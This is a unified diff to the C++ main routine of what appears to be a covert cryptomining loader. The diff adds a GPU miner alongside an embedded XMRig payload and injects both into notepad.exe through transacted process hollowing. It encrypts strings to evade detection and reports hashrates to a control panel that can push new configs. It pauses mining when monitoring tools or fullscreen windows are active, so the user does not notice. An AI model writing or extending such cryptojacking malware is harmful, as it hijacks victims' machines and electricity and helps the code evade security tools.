@@ -15,8 +15,8 @@
 #include "../include/json_printer.h"
 #include "../include/config_manager.h"
 #include "../include/encryption.h"
-#include "../src/inject_core.cpp"
 #include "../include/embedded_resource.h"
+#include "../src/inject_core.cpp"
 
 #ifdef ENABLE_ANTIVM
 #include "../include/antivm.h"
@@ -27,20 +27,28 @@
 #endif
 
 // Global variables for signal handling
-static DWORD g_minerPid = 0;
-static HANDLE g_minerProcess = NULL;
+static DWORD g_cpuMinerPid = 0;
+static DWORD g_gpuMinerPid = 0;
+static HANDLE g_cpuMinerProcess = NULL;
+static HANDLE g_gpuMinerProcess = NULL;
+static bool g_lastCpuIdleStatus = false;  // Track last idle status to detect changes
 
 // Signal handler for graceful shutdown
 BOOL WINAPI ConsoleHandler(DWORD signal) {
     if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
         signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
 #ifdef _DEBUG
-        std::cout << "[!] Signal received, terminating miner process..." << std::endl;
+        std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
 #endif
         
-        if (g_minerProcess != NULL) {
-            TerminateProcess(g_minerProcess, 0);
-            CloseHandle(g_minerProcess);
+        if (g_cpuMinerProcess != NULL) {
+            TerminateProcess(g_cpuMinerProcess, 0);
+            CloseHandle(g_cpuMinerProcess);
+        }
+        
+        if (g_gpuMinerProcess != NULL) {
+            TerminateProcess(g_gpuMinerProcess, 0);
+            CloseHandle(g_gpuMinerProcess);
         }
         
         return TRUE;
@@ -95,6 +103,15 @@ int main(int argc, char *argv[])
 
     std::string panelUrlsStr = ENCRYPT_STR("http://127.0.0.1:8080/api/miners/submit");
     
+    // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
+    const std::string GMINER_ALGO = ENCRYPT_STR("--algo ");
+    const std::string GMINER_SERVER = ENCRYPT_STR(" --server ");
+    const std::string GMINER_USER = ENCRYPT_STR(" --user ");
+    const std::string GMINER_DOT = ENCRYPT_STR(".");
+    const std::string GMINER_FAN = ENCRYPT_STR(" --fan ");
+    const std::string GMINER_SSL = ENCRYPT_STR(" --ssl");
+    const std::string GMINER_TAIL = ENCRYPT_STR(" --templimit 95 --api 10050 -w 0");
+    
 #ifdef _DEBUG
     std::cout << "[DEBUG] Decrypted URL(s): " << panelUrlsStr << std::endl;
 #endif
@@ -138,74 +155,125 @@ int main(int argc, char *argv[])
     
     const bool is32bit = false;
 
-    // Create mutable buffers
+    // Create mutable buffers for both miners
     wchar_t payloadPath[MAX_PATH] = {0};
     wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";
 
-    size_t payloadSize = 0;
-    BYTE *payladBuf = nullptr;
+    // Load XMRig miner from embedded resource
+    size_t xmrigPayloadSize = 0;
+    BYTE *xmrigBuf = nullptr;
     
     try {
-        LoadEmbeddedExe(payladBuf, payloadSize);
+        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
     } catch (const std::exception& e) {
-        std::cerr << "[-] Failed to load embedded exe: " << e.what() << std::endl;
-        return -1;
-    }
-    
-    if (payladBuf == NULL)
-    {
-        std::cerr << "Cannot read payload!" << std::endl;
+        std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
         return -1;
     }
 
-    // Build command line arguments from config
-    // Prefer CPU config if available, otherwise GPU config
-    const MinerConfig& selectedConfig = !cpuConfig.mining_url.empty() ? cpuConfig : gpuConfig;
-    bool isIdle = IsDeviceIdle(selectedConfig.wait_time_idle);
-    std::string final_command = configManager.BuildCommandLineArgs(selectedConfig, isIdle);
+#ifdef _DEBUG
+    std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
+#endif
+
+    // Load GMiner from embedded resource
+    size_t gminerPayloadSize = 0;
+    BYTE *gminerBuf = nullptr;
     
-    if (final_command.empty()) {
-        std::cerr << "[-] Failed to build command line arguments" << std::endl;
-        free_buffer(payladBuf);
-        return 1;
+    try {
+        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
+    } catch (const std::exception& e) {
+        std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
+        gminerBuf = nullptr;
+        gminerPayloadSize = 0;
+    }
+
+#ifdef _DEBUG
+    std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
+#endif
+
+    // Build command line arguments for CPU
+    std::cout << "[*] Checking if device is idle (threshold: " << cpuConfig.wait_time_idle << " minutes)..." << std::endl;
+    bool cpuIsIdle = IsDeviceIdle(cpuConfig.wait_time_idle);
+    std::string cpuCommand = configManager.BuildCommandLineArgs(cpuConfig, cpuIsIdle);
+    
+    if (cpuCommand.empty()) {
+        std::cerr << "[-] Failed to build CPU command line arguments" << std::endl;
     }
     
     // Store the initial config to detect changes
     MinerConfig lastCpuConfig = cpuConfig;
     MinerConfig lastGpuConfig = gpuConfig;
-    bool usingCpuConfig = !cpuConfig.mining_url.empty();
     
 #ifdef _DEBUG
-    std::cout << "[+] Generated command: " << final_command << std::endl;
+    std::cout << "[+] CPU Command: " << cpuCommand << std::endl;
 #endif
 
-    DWORD pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(final_command));
-    free_buffer(payladBuf);
-    if (pid == 0)
-    {
-        std::cerr << "Injection failed!\n";
-        return 1;
+    // Launch miners independently
+    DWORD cpuPid = 0;
+    std::optional<PROCESS_INFORMATION> cpuPi;
+    
+    // Only launch XMRig if CPU mining is enabled
+    if (cpuConfig.enabled == 1 && !cpuCommand.empty()) {
+        cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
+        cpuPi = ProcessStorage::GetProcess(cpuPid);
+        if (cpuPid != 0) {
+#ifdef _DEBUG
+            std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
+#endif
+        } else {
+            std::cerr << "[-] XMRig injection failed!" << std::endl;
+            free_buffer(xmrigBuf);
+            return 1;
+        }
+    } else {
+        std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
+        free_buffer(xmrigBuf);
     }
 
-    // Store global PID for signal handler
-    g_minerPid = pid;
-
-#ifdef _DEBUG
-    std::cout << "Injected into PID: " << pid << "\n";
-#endif
-
-    // Later you can access the full process info:
-    auto pi = ProcessStorage::GetProcess(pid);
-    if (pi)
+    DWORD gpuPid = 0;
+    std::optional<PROCESS_INFORMATION> gpuPi;
+    
+    if (gminerBuf != nullptr && gminerPayloadSize > 0)
     {
-        // Store global process handle for signal handler
-        g_minerProcess = pi->hProcess;
+        // Only launch GMiner if GPU mining is enabled
+        if (gpuConfig.enabled == 1) {
+            // Build gminer arguments from GPU config
+            std::string gminer_args = GMINER_ALGO + gpuConfig.algo + 
+                                      GMINER_SERVER + gpuConfig.mining_url + 
+                                      GMINER_USER + gpuConfig.wallet + GMINER_DOT + gpuConfig.password +
+                                      GMINER_FAN + std::to_string(gpuConfig.fan_speed);
+            if (gpuConfig.use_ssl == 1) {
+                gminer_args += GMINER_SSL;
+            }
+            gminer_args += GMINER_TAIL;
+            
 #ifdef _DEBUG
-        std::cout << "Process handle: " << pi->hProcess << "\n"
-                  << "Thread handle: " << pi->hThread << "\n"
-                  << "Main thread ID: " << pi->dwThreadId << "\n";
+            std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
+            std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
 #endif
+            
+            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+            gpuPi = ProcessStorage::GetProcess(gpuPid);
+            
+            if (gpuPid != 0) {
+#ifdef _DEBUG
+                std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
+#endif
+            } else {
+                std::cerr << "[-] GMiner injection failed!" << std::endl;
+            }
+        } else {
+            std::cout << "[*] GPU mining disabled, skipping GMiner injection" << std::endl;
+            free_buffer(gminerBuf);
+        }
+    } else {
+        std::cerr << "[-] Failed to load gminer!" << std::endl;
     }
+
+    // Store global PIDs and handles for signal handler
+    g_cpuMinerPid = cpuPid;
+    g_gpuMinerPid = gpuPid;
+    if (cpuPi) g_cpuMinerProcess = cpuPi->hProcess;
+    if (gpuPi) g_gpuMinerProcess = gpuPi->hProcess;
     int checkInCounter = 0;
     const int CHECK_IN_INTERVAL = 1; // seconds
 
@@ -216,21 +284,20 @@ int main(int argc, char *argv[])
         if (checkInCounter >= CHECK_IN_INTERVAL)
         {
             checkInCounter = 0;
-            double currentHashrate = GetMinerHashrate();
+            double cpuHashrate = 0.0;
+            double gpuHashrate = 0.0;
             
-            // Send hashrate to appropriate config (CPU or GPU)
-            double cpuHashrate = usingCpuConfig ? currentHashrate : 0.0;
-            double gpuHashrate = !usingCpuConfig ? currentHashrate : 0.0;
+            // Get hashrate from appropriate miner(s)
+            if (cpuPid != 0 && IsPidRunning(cpuPid)) {
+                cpuHashrate = GetMinerHashrate();
+            }
+            if (gpuPid != 0 && IsPidRunning(gpuPid)) {
+                gpuHashrate = GetGPUMinerHashrate();
+            }
             
-            if (currentHashrate >= 0) {
+            if (cpuHashrate >= 0 || gpuHashrate >= 0) {
 #ifdef _DEBUG
-                std::cout << "[*] Sending hashrate update to panel: " << currentHashrate << " H/s";
-                if (usingCpuConfig) {
-                    std::cout << " (CPU)";
-                } else {
-                    std::cout << " (GPU)";
-                }
-                std::cout << std::endl;
+                std::cout << "[*] Sending hashrate update to panel: CPU=" << cpuHashrate << " H/s, GPU=" << gpuHashrate << " H/s" << std::endl;
 #endif
                 
                 // Fetch config and check for changes
@@ -238,96 +305,188 @@ int main(int argc, char *argv[])
                     const MinerConfig& newCpuConfig = configManager.GetCPUConfig();
                     const MinerConfig& newGpuConfig = configManager.GetGPUConfig();
                     
-                    // Check if config has changed
+                    // Check if CPU config has changed
                     bool cpuConfigChanged = (newCpuConfig.mining_url != lastCpuConfig.mining_url ||
                                             newCpuConfig.wallet != lastCpuConfig.wallet ||
                                             newCpuConfig.password != lastCpuConfig.password ||
                                             newCpuConfig.non_idle_usage != lastCpuConfig.non_idle_usage ||
-                                            newCpuConfig.idle_usage != lastCpuConfig.idle_usage);
+                                            newCpuConfig.idle_usage != lastCpuConfig.idle_usage ||
+                                            newCpuConfig.enabled != lastCpuConfig.enabled);
                     
+                    // Check if GPU config has changed
                     bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
                                             newGpuConfig.wallet != lastGpuConfig.wallet ||
                                             newGpuConfig.password != lastGpuConfig.password ||
                                             newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
-                                            newGpuConfig.idle_usage != lastGpuConfig.idle_usage);
+                                            newGpuConfig.idle_usage != lastGpuConfig.idle_usage ||
+                                            newGpuConfig.enabled != lastGpuConfig.enabled);
                     
-                    if (cpuConfigChanged || gpuConfigChanged) {
+                    // Handle CPU config change
+                    if (cpuConfigChanged) {
 #ifdef _DEBUG
-                        std::cout << "[!] Config changed on server, restarting miner..." << std::endl;
+                        std::cout << "[!] CPU config changed on server" << std::endl;
 #endif
                         
-                        // Kill current miner process
-                        if (pi) {
-                            TerminateProcess(pi->hProcess, 0);
-                            WaitForSingleObject(pi->hProcess, INFINITE);
+                        lastCpuConfig = newCpuConfig;
+                        
+                        // Kill CPU miner if it's running
+                        if (cpuPi) {
+                            TerminateProcess(cpuPi.value().hProcess, 0);
+                            WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                            cpuPid = 0;
+                            cpuPi.reset();
                         }
                         
-                        // Update stored config
-                        lastCpuConfig = newCpuConfig;
+                        // Restart CPU miner if enabled
+                        if (newCpuConfig.enabled == 1) {
+                            bool newCpuIsIdle = IsDeviceIdle(newCpuConfig.wait_time_idle);
+                            std::string newCpuCommand = configManager.BuildCommandLineArgs(newCpuConfig, newCpuIsIdle);
+                            
+                            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(newCpuCommand));
+                            cpuPi = ProcessStorage::GetProcess(cpuPid);
+#ifdef _DEBUG
+                            std::cout << "[+] CPU miner restarted with new config. New PID: " << cpuPid << std::endl;
+#endif
+                        } else {
+#ifdef _DEBUG
+                            std::cout << "[*] CPU mining disabled in new config, keeping it stopped" << std::endl;
+#endif
+                        }
+                    }
+                    
+                    // Handle GPU config change
+                    if (gpuConfigChanged) {
+#ifdef _DEBUG
+                        std::cout << "[!] GPU config changed on server" << std::endl;
+#endif
+                        
                         lastGpuConfig = newGpuConfig;
                         
-                        // Build new command with updated config
-                        usingCpuConfig = !newCpuConfig.mining_url.empty();
-                        const MinerConfig& newSelectedConfig = usingCpuConfig ? newCpuConfig : newGpuConfig;
-                        bool newIsIdle = IsDeviceIdle(newSelectedConfig.wait_time_idle);
-                        std::string newCommand = configManager.BuildCommandLineArgs(newSelectedConfig, newIsIdle);
+                        // Kill GPU miner if it's running
+                        if (gpuPi) {
+                            TerminateProcess(gpuPi.value().hProcess, 0);
+                            WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+                            gpuPid = 0;
+                            gpuPi.reset();
+                        }
                         
-                        // Restart miner with new config
-                        pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(newCommand));
-                        pi = ProcessStorage::GetProcess(pid);
+                        // Restart GPU miner if enabled
+                        if (newGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
+                            std::string gminer_args = GMINER_ALGO + newGpuConfig.algo + 
+                                                      GMINER_SERVER + newGpuConfig.mining_url + 
+                                                      GMINER_USER + newGpuConfig.wallet + GMINER_DOT + newGpuConfig.password +
+                                                      GMINER_FAN + std::to_string(newGpuConfig.fan_speed);
+                            if (newGpuConfig.use_ssl == 1) {
+                                gminer_args += GMINER_SSL;
+                            }
+                            gminer_args += GMINER_TAIL;
+                            
+                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+                            gpuPi = ProcessStorage::GetProcess(gpuPid);
 #ifdef _DEBUG
-                        std::cout << "[+] Miner restarted with new config. New PID: " << pid << std::endl;
+                            std::cout << "[+] GPU miner restarted with new config. New PID: " << gpuPid << std::endl;
 #endif
+                        } else {
+#ifdef _DEBUG
+                            std::cout << "[*] GPU mining disabled in new config, keeping it stopped" << std::endl;
+#endif
+                        }
                     }
                 }
             }
         }
 
-        if (!IsPidRunning(pid))
-        {
+        // Monitor CPU miner process
+        if (cpuPid != 0) {
+            // Check idle status continuously (not just on crash)
+            bool cpuIsIdle = IsDeviceIdle(lastCpuConfig.wait_time_idle);
+            
+            // If idle status changed, restart the miner with updated CPU usage
+            if (cpuIsIdle != g_lastCpuIdleStatus) {
 #ifdef _DEBUG
-            std::cout << "[!] Process with PID " << pid << " is NOT running." << std::endl;
+                std::cout << "[*] CPU idle status changed from " << (g_lastCpuIdleStatus ? "IDLE" : "BUSY") << " to " << (cpuIsIdle ? "IDLE" : "BUSY") << ", restarting miner..." << std::endl;
 #endif
-            pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(final_command));
-            pi = ProcessStorage::GetProcess(pid);
-            if (AreProcessesRunning(processNames))
-            {
-                std::cout << "Monitoring detected running processes! not run func\n";
-                NtSuspendProcess(pi->hProcess);
-            }
-            else if (IsForegroundWindowFullscreen())
-            {
-                std::cout << "Monitoring detected fullscreen processes!\n";
-                NtSuspendProcess(pi->hProcess);
-            }
-            else
-            {
-                std::cout << "No monitored processes. not run func\n";
-                NtResumeProcess(pi->hProcess);
+                g_lastCpuIdleStatus = cpuIsIdle;
+                
+                if (cpuPi) {
+                    TerminateProcess(cpuPi.value().hProcess, 0);
+                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                    CloseHandle(cpuPi.value().hProcess);
+                    CloseHandle(cpuPi.value().hThread);
+                    cpuPi.reset();
+                    cpuPid = 0;
+                }
+                
+                // Restart with new idle status if CPU is enabled
+                if (lastCpuConfig.enabled == 1 && xmrigBuf != nullptr && xmrigPayloadSize > 0) {
+                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
+                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
+                    cpuPi = ProcessStorage::GetProcess(cpuPid);
+#ifdef _DEBUG
+                    std::cout << "[+] CPU miner restarted with " << (cpuIsIdle ? "IDLE" : "BUSY") << " settings. New PID: " << cpuPid << std::endl;
+#endif
+                }
+            } else if (!IsPidRunning(cpuPid)) {
+#ifdef _DEBUG
+                std::cout << "[!] CPU miner process (PID " << cpuPid << ") is NOT running." << std::endl;
+#endif
+                // Restart if CPU is still enabled
+                if (lastCpuConfig.enabled == 1) {
+                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
+                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
+                    cpuPi = ProcessStorage::GetProcess(cpuPid);
+                }
+            } else {
+#ifdef _DEBUG
+                std::cout << "[+] CPU miner process (PID " << cpuPid << ") is running" << std::endl;
+#endif
+                // Handle process suspension based on monitoring
+                if (AreProcessesRunning(processNames)) {
+                    NtSuspendProcess(cpuPi.value().hProcess);
+                } else if (IsForegroundWindowFullscreen()) {
+                    NtSuspendProcess(cpuPi.value().hProcess);
+                } else {
+                    NtResumeProcess(cpuPi.value().hProcess);
+                }
             }
         }
-        else
-        {
+
+        // Monitor GPU miner process
+        if (gpuPid != 0) {
+            if (!IsPidRunning(gpuPid)) {
 #ifdef _DEBUG
-            std::cout << "[!] Process with PID " << pid << " is running :)" << std::endl;
+                std::cout << "[!] GPU miner process (PID " << gpuPid << ") is NOT running." << std::endl;
 #endif
-            if (AreProcessesRunning(processNames))
-            {
-                std::cout << "Monitoring detected running processes! run func\n";
-                NtSuspendProcess(pi->hProcess);
-            }
-            else if (IsForegroundWindowFullscreen())
-            {
-                std::cout << "Monitoring detected fullscreen processes!\n";
-                NtSuspendProcess(pi->hProcess);
-            }
-            else
-            {
-                std::cout << "No monitored processes. run func\n";
-                NtResumeProcess(pi->hProcess);
+                // Restart if GPU is still enabled
+                if (lastGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
+                    std::string gminer_args = GMINER_ALGO + lastGpuConfig.algo + 
+                                              GMINER_SERVER + lastGpuConfig.mining_url + 
+                                              GMINER_USER + lastGpuConfig.wallet + GMINER_DOT + lastGpuConfig.password +
+                                              GMINER_FAN + std::to_string(lastGpuConfig.fan_speed);
+                    if (lastGpuConfig.use_ssl == 1) {
+                        gminer_args += GMINER_SSL;
+                    }
+                    gminer_args += GMINER_TAIL;
+                    
+                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+                    gpuPi = ProcessStorage::GetProcess(gpuPid);
+                }
+            } else {
+#ifdef _DEBUG
+                std::cout << "[+] GPU miner process (PID " << gpuPid << ") is running" << std::endl;
+#endif
+                // Handle process suspension based on monitoring
+                if (AreProcessesRunning(processNames)) {
+                    NtSuspendProcess(gpuPi.value().hProcess);
+                } else if (IsForegroundWindowFullscreen()) {
+                    NtSuspendProcess(gpuPi.value().hProcess);
+                } else {
+                    NtResumeProcess(gpuPi.value().hProcess);
+                }
             }
         }
-        Sleep(10000);  // Check every 1 second (counter increments for 5s check-in)
+        
+        Sleep(10000);  // Check every 10 seconds
     }
 
     return 0;
